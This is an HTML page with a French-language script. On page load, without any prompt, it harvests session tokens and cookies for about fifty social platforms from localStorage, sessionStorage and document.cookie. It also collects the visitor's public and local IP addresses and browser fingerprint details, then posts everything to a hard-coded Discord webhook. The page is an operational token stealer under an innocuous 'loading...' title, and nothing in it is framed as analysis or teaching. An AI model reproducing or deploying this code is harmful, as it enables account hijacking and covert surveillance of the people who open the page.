<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>🔬 loading...</title>
    <style>
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 20px;
            margin: 0;
        }
        #status {
            position: fixed;
            top: 10px;
            right: 10px;
            background: #1a1a1a;
            padding: 15px;
            border: 3px solid #00ff00;
            border-radius: 10px;
            font-weight: bold;
            z-index: 1000;
            box-shadow: 0 0 20px rgba(0,255,0,0.3);
        }
        pre {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 8px;
            overflow-x: auto;
            max-height: 500px;
            border: 1px solid #00ff00;
            font-size: 12px;
            line-height: 1.5;
        }
        .stats {
            background: #1a3a1a;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 5px solid #00ff00;
        }
        .token-found {
            color: #ffaa00;
            font-weight: bold;
            background: #332200;
            padding: 2px 5px;
            border-radius: 3px;
        }
        h1 {
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
        }
        .counter {
            font-size: 24px;
            font-weight: bold;
            color: #ffff00;
        }
    </style>
</head>
<body>
    <div id="status">.</div>
    
    <h1>.</h1>
    
    <div class="stats" id="stats">
        <span class="counter">0</span> tokens trouvés sur <span class="counter">50+</span> sites
    </div>
    
    <pre id="log"></pre>

    <script>
        // CONFIGURATION
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457799780876157213/x-damoxpZ470JOReBfZWAXqtsJYMzuxcj0rn1eOvvgjo-sQLam76wCkYGAt24Ny1L4av";
        
        function log(message, isToken = false) {
            const logDiv = document.getElementById('log');
            const prefix = isToken ? '🔥 ' : '📌 ';
            logDiv.innerHTML += `[${new Date().toLocaleTimeString()}] ${prefix}${message}\n`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        // LISTE COMPLÈTE DES 50+ SITES AVEC LEURS PATTERNS
        const SITES = {
            // RÉSEAUX SOCIAUX PRINCIPAUX
            facebook: {
                name: 'Facebook',
                patterns: [
                    /EAAA[a-zA-Z0-9_-]{100,}/,
                    /c_user=[0-9]+/,
                    /xs=[a-zA-Z0-9_-]+/,
                    /fb_dtsg=[a-zA-Z0-9_-]+/,
                    /sb=[a-zA-Z0-9_-]+/,
                    /datr=[a-zA-Z0-9_-]+/
                ],
                keywords: ['facebook', 'fb', 'c_user', 'xs', 'fb_dtsg']
            },
            instagram: {
                name: 'Instagram',
                patterns: [
                    /sessionid=[a-zA-Z0-9_-]{50,}/,
                    /ig_did=[a-zA-Z0-9_-]+/,
                    /csrftoken=[a-zA-Z0-9_-]+/,
                    /ds_user_id=[0-9]+/,
                    /rur=[a-zA-Z0-9_-]+/
                ],
                keywords: ['instagram', 'ig', 'sessionid', 'ds_user']
            },
            tiktok: {
                name: 'TikTok',
                patterns: [
                    /sessionid=[a-zA-Z0-9_-]{50,}/,
                    /tt_[a-zA-Z0-9_-]+/,
                    /passport_[a-zA-Z0-9_-]+/,
                    /sid_[a-zA-Z0-9_-]+/,
                    /uid_[a-zA-Z0-9_-]+/
                ],
                keywords: ['tiktok', 'tt', 'passport']
            },
            snapchat: {
                name: 'Snapchat',
                patterns: [
                    /snapchat[a-zA-Z0-9_-]{50,}/i,
                    /sc-auth[a-zA-Z0-9_-]+/i,
                    /snaptoken[a-zA-Z0-9_-]+/i,
                    /[a-f0-9]{64,}/i,
                    /snapchatSession=[a-zA-Z0-9_-]+/
                ],
                keywords: ['snap', 'sc', 'snapchat']
            },
            x: {
                name: 'X (Twitter)',
                patterns: [
                    /auth_token=[a-zA-Z0-9_-]{50,}/,
                    /twid=[a-zA-Z0-9_-]+/,
                    /ct0=[a-zA-Z0-9_-]+/,
                    /kdt=[a-zA-Z0-9_-]+/,
                    /_twitter_[a-zA-Z0-9_-]+/
                ],
                keywords: ['twitter', 'twid', 'auth_token', 'x.com']
            },
            youtube: {
                name: 'YouTube',
                patterns: [
                    /SAPISID[a-zA-Z0-9_-]{50,}/,
                    /APISID[a-zA-Z0-9_-]{50,}/,
                    /HSID[a-zA-Z0-9_-]{50,}/,
                    /SSID[a-zA-Z0-9_-]{50,}/,
                    /LOGIN_INFO=[a-zA-Z0-9_-]+/
                ],
                keywords: ['youtube', 'yt', 'apisid', 'sapisid']
            },
            whatsapp: {
                name: 'WhatsApp',
                patterns: [
                    /wa_session=[a-zA-Z0-9_-]+/,
                    /whatsapp[a-zA-Z0-9_-]{50,}/i,
                    /wa_auth=[a-zA-Z0-9_-]+/,
                    /wa_lang=[a-zA-Z0-9_-]+/
                ],
                keywords: ['whatsapp', 'wa']
            },
            telegram: {
                name: 'Telegram',
                patterns: [
                    /tg_web_app_[a-zA-Z0-9_-]+/,
                    /tg_user=[a-zA-Z0-9_-]+/,
                    /telegram[a-zA-Z0-9_-]{50,}/i,
                    /tg_auth=[a-zA-Z0-9_-]+/
                ],
                keywords: ['telegram', 'tg']
            },
            discord: {
                name: 'Discord',
                patterns: [
                    /mfa\.[a-zA-Z0-9_-]{84}/,
                    /[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}/,
                    /discord[a-zA-Z0-9_-]{50,}/i
                ],
                keywords: ['discord', 'token', 'mfa']
            },
            reddit: {
                name: 'Reddit',
                patterns: [
                    /reddit[a-zA-Z0-9_-]{50,}/i,
                    /reddit_session=[a-zA-Z0-9_-]+/,
                    /reddit_user=[a-zA-Z0-9_-]+/
                ],
                keywords: ['reddit']
            },
            linkedin: {
                name: 'LinkedIn',
                patterns: [
                    /li_at=[a-zA-Z0-9_-]{100,}/,
                    /liap=[a-zA-Z0-9_-]+/,
                    /JSESSIONID=[a-zA-Z0-9_-]+/
                ],
                keywords: ['linkedin', 'li_at']
            },
            pinterest: {
                name: 'Pinterest',
                patterns: [
                    /pinterest[a-zA-Z0-9_-]{50,}/i,
                    /_pinterest_sess=[a-zA-Z0-9_-]+/,
                    /pinterest_web_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['pinterest']
            },
            tumblr: {
                name: 'Tumblr',
                patterns: [
                    /tumblr[a-zA-Z0-9_-]{50,}/i,
                    /tumblr_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['tumblr']
            },
            quora: {
                name: 'Quora',
                patterns: [
                    /quora[a-zA-Z0-9_-]{50,}/i,
                    /quora_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['quora']
            },
            threads: {
                name: 'Threads',
                patterns: [
                    /threads[a-zA-Z0-9_-]{50,}/i,
                    /threads_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['threads']
            },
            bereal: {
                name: 'BeReal',
                patterns: [
                    /bereal[a-zA-Z0-9_-]{50,}/i,
                    /bereal_token=[a-zA-Z0-9_-]+/
                ],
                keywords: ['bereal']
            },
            twitch: {
                name: 'Twitch',
                patterns: [
                    /twitch[a-zA-Z0-9_-]{50,}/i,
                    /auth-token=[a-zA-Z0-9_-]+/i,
                    /oauth[a-zA-Z0-9_-]+/i,
                    /twitch_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['twitch']
            },
            wechat: {
                name: 'WeChat',
                patterns: [
                    /wechat[a-zA-Z0-9_-]{50,}/i,
                    /wx_[a-zA-Z0-9_-]+/
                ],
                keywords: ['wechat', 'wx']
            },
            weibo: {
                name: 'Weibo',
                patterns: [
                    /weibo[a-zA-Z0-9_-]{50,}/i,
                    /wb_[a-zA-Z0-9_-]+/
                ],
                keywords: ['weibo', 'wb']
            },
            line: {
                name: 'LINE',
                patterns: [
                    /line[a-zA-Z0-9_-]{50,}/i,
                    /line_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['line']
            },
            kakaotalk: {
                name: 'KakaoTalk',
                patterns: [
                    /kakao[a-zA-Z0-9_-]{50,}/i,
                    /kakao_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['kakao']
            },
            signal: {
                name: 'Signal',
                patterns: [
                    /signal[a-zA-Z0-9_-]{50,}/i,
                    /signal_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['signal']
            },
            viber: {
                name: 'Viber',
                patterns: [
                    /viber[a-zA-Z0-9_-]{50,}/i,
                    /viber_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['viber']
            },
            clubhouse: {
                name: 'Clubhouse',
                patterns: [
                    /clubhouse[a-zA-Z0-9_-]{50,}/i,
                    /ch_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['clubhouse', 'ch']
            },
            mastodon: {
                name: 'Mastodon',
                patterns: [
                    /mastodon[a-zA-Z0-9_-]{50,}/i,
                    /mastodon_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['mastodon']
            },
            nextdoor: {
                name: 'Nextdoor',
                patterns: [
                    /nextdoor[a-zA-Z0-9_-]{50,}/i,
                    /nd_[a-zA-Z0-9_-]+/
                ],
                keywords: ['nextdoor', 'nd']
            },
            badoo: {
                name: 'Badoo',
                patterns: [
                    /badoo[a-zA-Z0-9_-]{50,}/i,
                    /badoo_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['badoo']
            },
            meetup: {
                name: 'Meetup',
                patterns: [
                    /meetup[a-zA-Z0-9_-]{50,}/i,
                    /mu_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['meetup', 'mu']
            },
            vsco: {
                name: 'VSCO',
                patterns: [
                    /vsco[a-zA-Z0-9_-]{50,}/i,
                    /vsco_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['vsco']
            },
            likee: {
                name: 'Likee',
                patterns: [
                    /likee[a-zA-Z0-9_-]{50,}/i,
                    /likee_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['likee']
            },
            triller: {
                name: 'Triller',
                patterns: [
                    /triller[a-zA-Z0-9_-]{50,}/i,
                    /triller_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['triller']
            },
            kwai: {
                name: 'Kwai',
                patterns: [
                    /kwai[a-zA-Z0-9_-]{50,}/i,
                    /kwai_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['kwai']
            },
            rumble: {
                name: 'Rumble',
                patterns: [
                    /rumble[a-zA-Z0-9_-]{50,}/i,
                    /rumble_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['rumble']
            },
            odysee: {
                name: 'Odysee',
                patterns: [
                    /odysee[a-zA-Z0-9_-]{50,}/i,
                    /odysee_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['odysee']
            },
            substack: {
                name: 'Substack',
                patterns: [
                    /substack[a-zA-Z0-9_-]{50,}/i,
                    /substack_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['substack']
            },
            patreon: {
                name: 'Patreon',
                patterns: [
                    /patreon[a-zA-Z0-9_-]{50,}/i,
                    /patreon_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['patreon']
            },
            goodreads: {
                name: 'Goodreads',
                patterns: [
                    /goodreads[a-zA-Z0-9_-]{50,}/i,
                    /gr_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['goodreads', 'gr']
            },
            letterboxd: {
                name: 'Letterboxd',
                patterns: [
                    /letterboxd[a-zA-Z0-9_-]{50,}/i,
                    /lb_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['letterboxd', 'lb']
            },
            caffeine: {
                name: 'Caffeine',
                patterns: [
                    /caffeine[a-zA-Z0-9_-]{50,}/i,
                    /caffeine_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['caffeine']
            },
            amino: {
                name: 'Amino',
                patterns: [
                    /amino[a-zA-Z0-9_-]{50,}/i,
                    /amino_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['amino']
            },
            yubo: {
                name: 'Yubo',
                patterns: [
                    /yubo[a-zA-Z0-9_-]{50,}/i,
                    /yubo_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['yubo']
            },
            plurk: {
                name: 'Plurk',
                patterns: [
                    /plurk[a-zA-Z0-9_-]{50,}/i,
                    /plurk_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['plurk']
            },
            ello: {
                name: 'Ello',
                patterns: [
                    /ello[a-zA-Z0-9_-]{50,}/i,
                    /ello_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['ello']
            },
            diaspora: {
                name: 'Diaspora',
                patterns: [
                    /diaspora[a-zA-Z0-9_-]{50,}/i,
                    /diaspora_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['diaspora']
            },
            friendica: {
                name: 'Friendica',
                patterns: [
                    /friendica[a-zA-Z0-9_-]{50,}/i,
                    /friendica_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['friendica']
            },
            gab: {
                name: 'Gab',
                patterns: [
                    /gab[a-zA-Z0-9_-]{50,}/i,
                    /gab_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['gab']
            },
            parler: {
                name: 'Parler',
                patterns: [
                    /parler[a-zA-Z0-9_-]{50,}/i,
                    /parler_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['parler']
            },
            truthsocial: {
                name: 'Truth Social',
                patterns: [
                    /truth[a-zA-Z0-9_-]{50,}/i,
                    /truth_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['truth']
            },
            lemon8: {
                name: 'Lemon8',
                patterns: [
                    /lemon8[a-zA-Z0-9_-]{50,}/i,
                    /lemon8_session=[a-zA-Z0-9_-]+/
                ],
                keywords: ['lemon8']
            }
        };

        // COLLECTE DES TOKENS
        function collectAllTokens() {
            log(".");
            
            const results = {};
            let totalTokens = 0;
            
            // Initialiser les résultats
            for (let site in SITES) {
                results[site] = {
                    name: SITES[site].name,
                    localStorage: [],
                    sessionStorage: [],
                    cookies: [],
                    fullTokens: []
                };
            }

            // 1. ANALYSE LOCALSTORAGE
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    const keyLower = key.toLowerCase();
                    
                    for (let site in SITES) {
                        const siteInfo = SITES[site];
                        
                        // Vérifier les mots-clés
                        for (let keyword of siteInfo.keywords) {
                            if (keyLower.includes(keyword.toLowerCase())) {
                                results[site].localStorage.push({
                                    key: key,
                                    valuePreview: value?.substring(0, 50)
                                });
                            }
                        }
                        
                        // Vérifier les patterns
                        if (typeof value === 'string') {
                            for (let pattern of siteInfo.patterns) {
                                const matches = value.match(pattern);
                                if (matches) {
                                    results[site].fullTokens.push({
                                        source: 'localStorage',
                                        key: key,
                                        token: matches[0],
                                        site: siteInfo.name
                                    });
                                    totalTokens++;
                                    log(`🔥 TOKEN ${siteInfo.name} trouvé dans localStorage: ${matches[0].substring(0, 30)}...`, true);
                                }
                            }
                        }
                    }
                }
            } catch(e) {}

            // 2. ANALYSE SESSIONSTORAGE
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    const value = sessionStorage.getItem(key);
                    
                    for (let site in SITES) {
                        if (typeof value === 'string') {
                            for (let pattern of SITES[site].patterns) {
                                const matches = value.match(pattern);
                                if (matches) {
                                    results[site].fullTokens.push({
                                        source: 'sessionStorage',
                                        key: key,
                                        token: matches[0],
                                        site: SITES[site].name
                                    });
                                    totalTokens++;
                                    log(`. ${SITES[site].name} trouvé dans sessionStorage: ${matches[0].substring(0, 30)}...`, true);
                                }
                            }
                        }
                    }
                }
            } catch(e) {}

            // 3. ANALYSE COOKIES
            if (document.cookie) {
                const cookies = document.cookie.split(';');
                cookies.forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    
                    for (let site in SITES) {
                        // Vérifier le nom du cookie
                        const nameLower = name.toLowerCase();
                        for (let keyword of SITES[site].keywords) {
                            if (nameLower.includes(keyword.toLowerCase())) {
                                results[site].cookies.push({
                                    name: name,
                                    valuePreview: value?.substring(0, 50)
                                });
                            }
                        }
                        
                        // Vérifier patterns dans la valeur
                        if (value) {
                            for (let pattern of SITES[site].patterns) {
                                const matches = value.match(pattern);
                                if (matches) {
                                    results[site].fullTokens.push({
                                        source: 'cookie',
                                        key: name,
                                        token: matches[0],
                                        site: SITES[site].name
                                    });
                                    totalTokens++;
                                    log(`🔥 TOKEN ${SITES[site].name} trouvé dans cookie: ${matches[0].substring(0, 30)}...`, true);
                                }
                            }
                        }
                    }
                });
            }

            // Mise à jour des stats
            document.querySelector('.counter').textContent = totalTokens;
            
            return results;
        }

        // COLLECTE IP
        async function collectIPs() {
            log("🌐 COLLECTE DES ADRESSES IP...");
            
            const ips = {
                publicIPv4: null,
                publicIPv6: null,
                localIPv4: [],
                localIPv6: []
            };

            // IPv4 Publique
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ips.publicIPv4 = data.ip;
                log(`✅ IPv4 Publique: ${data.ip}`);
            } catch(e) {}

            // IPv6 Publique
            try {
                const response = await fetch('https://api6.ipify.org?format=json');
                const data = await response.json();
                ips.publicIPv6 = data.ip;
                log(`✅ IPv6 Publique: ${data.ip}`);
            } catch(e) {}

            // IPs Locales via WebRTC
            try {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                await pc.createOffer().then(pc.setLocalDescription.bind(pc));
                
                pc.onicecandidate = (ice) => {
                    if (ice.candidate) {
                        const ipRegex = /([0-9a-f:]+|[0-9]{1,3}\.){3,}/gi;
                        const matches = ice.candidate.candidate.match(ipRegex);
                        if (matches) {
                            matches.forEach(ip => {
                                if (ip.includes(':')) {
                                    ips.localIPv6.push(ip);
                                    log(`📡 IPv6 Locale: ${ip}`);
                                } else {
                                    ips.localIPv4.push(ip);
                                    log(`📡 IPv4 Locale: ${ip}`);
                                }
                            });
                        }
                    }
                };
                
                setTimeout(() => pc.close(), 1000);
            } catch(e) {}

            return ips;
        }

        // ENVOI AU WEBHOOK
        async function sendToWebhook() {
            log("📤 PRÉPARATION DE L'ENVOI...");
            
            const ips = await collectIPs();
            const tokens = collectAllTokens();
            
            // Compter tous les tokens
            let totalTokens = 0;
            let tokensBySite = {};
            
            for (let site in tokens) {
                tokensBySite[site] = tokens[site].fullTokens.length;
                totalTokens += tokens[site].fullTokens.length;
            }

            // Construction du message
            let message = "**🔬 RAPPORT COMPLET - 50+ PLATEFORMES**\n\n";
            
            // IPs
            message += "**🌐 INFORMATIONS IP:**\n";
            message += `IPv4 Publique: ${ips.publicIPv4 || 'N/A'}\n`;
            message += `IPv6 Publique: ${ips.publicIPv6 || 'N/A'}\n`;
            message += `IPv4 Locale: ${ips.localIPv4.join(', ') || 'N/A'}\n`;
            message += `IPv6 Locale: ${ips.localIPv6.join(', ') || 'N/A'}\n\n`;
            
            message += `**🔑 TOKENS TROUVÉS: ${totalTokens} au total**\n\n`;
            
            // Statistiques par site
            message += "**📊 STATISTIQUES PAR SITE:**\n";
            for (let site in tokensBySite) {
                if (tokensBySite[site] > 0) {
                    message += `- ${SITES[site].name}: ${tokensBySite[site]} tokens\n`;
                }
            }
            message += '\n';

            // Liste détaillée des tokens
            message += "**📋 LISTE DÉTAILLÉE DES TOKENS:**\n\n";
            
            for (let site in tokens) {
                if (tokens[site].fullTokens.length > 0) {
                    message += `**${SITES[site].name}:**\n`;
                    tokens[site].fullTokens.forEach((t, index) => {
                        message += `[${index+1}] ${t.source}.${t.key}: \`${t.token}\`\n`;
                    });
                    message += '\n';
                }
            }

            // localStorage sensible
            message += "**📁 LOCALSTORAGE SENSIBLE:**\n";
            for (let site in tokens) {
                if (tokens[site].localStorage.length > 0) {
                    message += `\n${SITES[site].name}:\n`;
                    tokens[site].localStorage.forEach(item => {
                        message += `  ${item.key}: ${item.valuePreview}...\n`;
                    });
                }
            }

            // Informations navigateur
            message += "\n**💻 INFORMATIONS NAVIGATEUR:**\n";
            message += `URL: ${window.location.href}\n`;
            message += `User-Agent: ${navigator.userAgent}\n`;
            message += `Plateforme: ${navigator.platform}\n`;
            message += `Langue: ${navigator.language}\n`;
            message += `Cookies: ${document.cookie ? 'Présents' : 'Absents'}\n`;
            message += `localStorage: ${localStorage.length} items\n`;
            message += `sessionStorage: ${sessionStorage.length} items\n`;
            message += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
            message += `Écran: ${screen.width}x${screen.height}\n`;

            // Envoi
            try {
                log("📡 ENVOI AU WEBHOOK EN COURS...");
                
                // Diviser le message en plusieurs parties si nécessaire
                const maxLength = 1900;
                let parts = [];
                
                for (let i = 0; i < message.length; i += maxLength) {
                    parts.push(message.substring(i, i + maxLength));
                }
                
                for (let i = 0; i < parts.length; i++) {
                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: parts[i],
                            username: i === 0 ? 'Recherche 50+ Sites' : `Suite ${i+1}/${parts.length}`,
                            avatar_url: 'https://i.imgur.com/3XxYxJx.png'
                        })
                    });
                    
                    if (response.ok) {
                        log(`✅ Partie ${i+1}/${parts.length} envoyée avec succès !`);
                    }
                    
                    // Attendre un peu entre les envois
                    if (i < parts.length - 1) {
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                }
                
                document.getElementById('status').innerHTML = '✅ ENVOI TERMINÉ !';
                log("✅ TOUS LES TOKENS ONT ÉTÉ ENVOYÉS AVEC SUCCÈS !");
                
            } catch (error) {
                log(`❌ ERREUR: ${error.message}`);
                document.getElementById('status').innerHTML = '❌ ÉCHEC';
            }
        }

        // LANCEMENT AUTOMATIQUE
        (async function() {
            log("🚀 DÉMARRAGE DE LA RECHERCHE SUR 50+ PLATEFORMES...");
            document.getElementById('status').innerHTML = '⏳ COLLECTE EN COURS...';
            
            setTimeout(() => {
                sendToWebhook();
            }, 1000);
        })();
    </script>
</body>
</html>
